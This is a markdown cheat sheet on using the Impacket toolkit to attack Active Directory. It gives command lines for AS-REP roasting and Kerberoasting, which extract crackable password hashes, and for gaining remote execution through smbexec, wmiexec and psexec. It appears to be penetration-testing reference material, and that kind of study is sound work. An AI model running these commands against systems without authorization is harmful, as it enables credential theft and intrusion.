# Impacket - Tools

> Impacket is a Python toolkit for working with network protocols, especially SMB and Kerberos, commonly used in Active Directory pentesting and post-exploitation.

## Basic usage

> These options are common across many Impacket scripts.

```bash
# Basic authentication format
impacket-script [[domain/]username[:password]]@<target|ip>

# Common options used in most Impacket scripts
-u USERNAME          # Username
-p PASSWORD          # Password (can be omitted with -no-pass)
-d DOMAIN            # Domain name
-h or --help         # Display help
-hashes LM:NT        # Pass LM:NT hashes instead of password
-dc-ip IP            # Domain Controller IP (for LDAP requests etc)
-target-ip IP        # Target machine IP (for SMB/WMI/WinRM scripts)
-no-pass             # Use when no password is required (e.g., AS-REP roasting)
```

```bash
# Common locations of Impacket scripts on Kali Linux:
/usr/share/impacket/script/
/usr/bin/impacket-*
/usr/share/doc/python3-impacket/examples/
```

## Kerberos exploit

- `-request-user`: Used to request a specific user account
- `-no-pass`: Used to test ldap anonymous bind

### AS-REP Roasting (GetNPUsers.py)

> Extract AS-REP hashes from accounts without preauthentication enabled.

```bash
# Query users from file, no password needed, output for hashcat/john:
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -format hashcat -outputfile asrep_hashes.txt

# Query specific user with password:
GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -format hashcat -outputfile asrep_hashes.txt

# Query specific user with NT hash:
GetNPUsers.py $DOMAIN/$USER -hashes $LM_HASH:$NT_HASH -dc-ip $DC_IP -format hashcat -outputfile asrep_hashes.txt
```

### Kerberoasting (GetUserSPNs.py)

> Request service tickets (TGS) for service accounts to crack their passwords offline.

- Prerequisites:
  - Valid user account (auth required)

```bash
# Request all SPNs using user credentials:
GetUserSPNs.py -request $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP

# Request specific user
GetUserSPNs.py -request $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request-user $TARGET_USER -outputfile kerberoasting.txt
```

## Remote Execution

- Prerequisites:
  - Valid user account (auth required)

```bash
# SMB
impacket-smbexec -u $USER -p $PASSWORD -d $DOMAIN $TARGET
```

```bash
# WMI
impacket-wmiexec -u $USER -p $PASSWORD -d $DOMAIN $TARGET
```

```bash
impacket-psexec -u $USER -p $PASSWORD -d $DOMAIN $TARGET
```
